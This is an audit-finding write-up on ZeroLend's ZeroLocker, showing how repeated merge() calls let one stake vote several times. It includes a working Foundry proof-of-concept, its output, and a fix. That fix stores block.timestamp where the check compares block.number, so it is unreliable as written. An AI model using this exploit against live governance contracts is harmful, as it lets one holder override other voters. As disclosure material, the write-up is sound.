---
tags:
  - lang/solidity
  - sector/farm
  - sector/governance
  - sector/nft
  - sector/staking
  - sector/staking-pool
  - platform/cantina
  - has/poc
  - severity/high
  - vuln/governance/proposal-manipulation
  - trigger/governance-vote
  - novelty/variant
  - misassumption/admin-is-honest
  - fix/add-check
protocol: "[[ZeroLend]]"
auditors:
  - "[[elhaj]]"
report: "https://cdn.cantina.xyz/reports/cantina_competition_zerolend_jan2024.pdf"
genome:
  - "[[proposal-manipulation]]"
  - "[[governance-vote]]"
  - "[[variant]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[proposal-state-check]]"
  - "[[timestamp-dependence]]"
---
# A malicious user can inﬂate his voting power via merge() 

- id: 40818
- impact: HIGH
- protocol: [[ZeroLend]]
- reporter: elhaj (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_zerolend_jan2024.pdf

## Summary


The ZeroLocker contract has a function called merge that is meant to allow users to combine multiple NFTs into one. However, this function can be exploited to artificially increase the voting power of an NFT, which can then be used to manipulate governance proposals. This is done by merging a larger-staked NFT into a smaller one, which increases the smaller NFT's bias and allows the user to vote multiple times with the same stake. This vulnerability can be easily exploited by a malicious user, giving them an unfair advantage in governance decisions. To fix this issue, the merge function should be updated to record changes in the ownershipChange mapping for the NFT being merged into. This will prevent users from unfairly inflating their voting power and disrupting the governance process.

## Details

## Vulnerability in ZeroLocker.sol - Merge Function Exploit

## Context
ZeroLocker.sol#L711

## Description
The `merge` function in the ZeroLocker contract allows users to consolidate their stakes by merging multiple NFTs into one. However, this function can be exploited to artificially inflate the voting power of an NFT, which can then be used to manipulate ongoing governance proposals.

An external contract will call the function `balanceOfNFT` to get the voting power for a specific `tokenId`. When a user attempts to vote with this token:

```solidity
function balanceOfNFT(uint256 _tokenId) external view override returns (uint256) {
    if (ownershipChange[_tokenId] == block.number) return 0;
    return _balanceOfNFT(_tokenId, block.timestamp);
}

function _balanceOfNFT(uint256 _tokenId, uint256 _t) internal view returns (uint256) {
    uint256 _epoch = userPointEpoch[_tokenId];
    
    if (_epoch == 0) {
        return 0;
    } else {
        Point memory lastPoint = _userPointHistory[_tokenId][_epoch];
        lastPoint.bias -= lastPoint.slope * int128(int256(_t) - int256(lastPoint.ts));
        
        if (lastPoint.bias < 0) {
            lastPoint.bias = 0;
        }
        return uint256(int256(lastPoint.bias));
    }
}
```

A malicious user with multiple NFTs locked in the ZeroLocker contract can execute a series of merges to move their voting power into multiple NFTs. By merging a larger-staked NFT into a smaller one, the user can increase the bias of the smaller NFT. The user can then use this newly merged NFT to vote and pass a malicious proposal, effectively using the same stake to vote multiple times. This process can be repeated by merging the inflated NFT into another small-staked NFT, further increasing its bias and using it to vote again, which can be done in the same transaction.

## Proof of Concept

1. Bob creates multiple locks in the ZeroLocker contract, with one major lock holding a significant amount of `zeroToken` and several smaller locks with minimal amounts.
2. After some time, Bob begins the exploitation process by voting with the major lock.
3. Bob then merges the major lock into one of the smaller locks using the `merge` function, which increases the bias of the smaller lock due to the added tokens from the major lock.
4. With the inflated bias of the newly merged lock, Bob votes again, effectively using the same tokens to increase his voting power.
5. Bob repeats this process, merging the inflated lock with another small lock and voting again, further increasing his voting power each time.

This vulnerability allows a single user to have an outsized influence on the outcome of governance decisions.

## Example Code Implementation

The following is a simulated contract setup that shows how Bob could inflate his voting power by merging:

```solidity
contract setup is Test {
    uint constant supply = 1000000000 ether;
    BonusPool bonus;
    VestedZeroLend vestToken;
    VestedZeroLend zeroToken;
    ZeroLocker locker;
    FeeDistributor feeDistributor;
    StakingEmissions emissions;
    StreamedVesting vest;

    function setUp() public virtual {
        // deploy zero token :
        zeroToken = new VestedZeroLend();
        // deploy vest token :
        vestToken = new VestedZeroLend();
        // deploy locker :
        locker = new ZeroLocker();
        locker.initialize(address(zeroToken));
        // deploy fee distributor :
        feeDistributor = new FeeDistributor();
        feeDistributor.initialize(address(locker), address(vestToken));
        // deploy emissions :
        emissions = new StakingEmissions();
        emissions.initialize(feeDistributor, vestToken, 100_000 ether);
        // deploy vest :
        vest = new StreamedVesting();
        // deploy bonus pool :
        bonus = new BonusPool(zeroToken, address(vest));
        vest.initialize(zeroToken, IERC20Burnable(address(vestToken)), locker, bonus);
        
        // initial balances :
        zeroToken.transfer(address(bonus), 5 * supply);
        zeroToken.transfer(address(vest), 55 * supply);
        vestToken.transfer(address(emissions), 50 * supply);
        vestToken.addwhitelist(address(emissions), true);
        vestToken.addwhitelist(address(feeDistributor), true);

        // disable whitelist from the zero token:
        zeroToken.toggleWhitelist(false, false);
        // start vesting and emissions :
        skip(3 days);
        vest.start();
        emissions.start();
    }

    address bob = makeAddr("bob");
    uint votingPower;

    // simulate the voting behavior :
    function vote(uint tokenId) public {
        // this calls the locker contract to get the voting power of the token id :
        votingPower += locker.balanceOfNFT(tokenId);
    }

    function test_votingPower() public {
        zeroToken.transfer(bob, 10000 ether);
        vm.startPrank(bob);
        zeroToken.approve(address(locker), 1000 ether);
        
        // Bob create one normal lock, and 9 tiny :
        uint[11] memory tokenIds;
        for (uint i; i < 10; i++) {
            if (i == 0) {
                // the first lock will be the major one with the biggest amount that will be moved over others to inflate the voting power:
                tokenIds[i] = locker.createLock(100 ether, 20 weeks);
                continue;
            }
            // tiny locks starting from index 2 => 10:
            tokenIds[i] = locker.createLock(100, 20 weeks);
        }

        skip(3 weeks); // just skip 3 weeks
        
        // catch the real voting power if Bob not malicious this will be his real voting power :
        for (uint i; i < 9; i++) {
            // uninflated voting power :
            vote(tokenIds[i]);
        }

        uint uninflatedVotingPower = votingPower; // catch the real voting power
        
        // reset the voting power to calculate the inflated voting power when Bob malicious:
        votingPower = 0;
        for (uint i; i < 9; i++) {
            // vote with major lock:
            vote(tokenIds[i]);
            locker.merge(tokenIds[i], tokenIds[i + 1]);
        }
        
        // compare the inflated voting power and the actual voting power :
        console.log("inflated voting power => ", votingPower);
        console.log("the real voting power => ", uninflatedVotingPower);
        uint inflatedAmount = votingPower - uninflatedVotingPower;
        console.log("the inflated amount => ", inflatedAmount);
    }
}
```

### Output
```
[PASS] test_votingPower() (gas: 4794558)
Logs:
inflated voting power => 71506842180354954054
the real voting power => 7945204686706106006
the inflated amount => 63561637493648848048
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.75ms
```

The vulnerability enables a user to multiply their vote unfairly, potentially tipping the scales in favor of harmful proposals and disrupting fair governance.

## Recommendation
Update the merge function to record a change in the `ownershipChange` mapping for the destination NFT:

```solidity
function merge(uint256 _from, uint256 _to) external override {
    // previous code...
    _depositFor(_to, value0, end, _locked1, DepositType.MERGE_TYPE);
    + ownershipChange[_to] = block.timestamp;
}
```
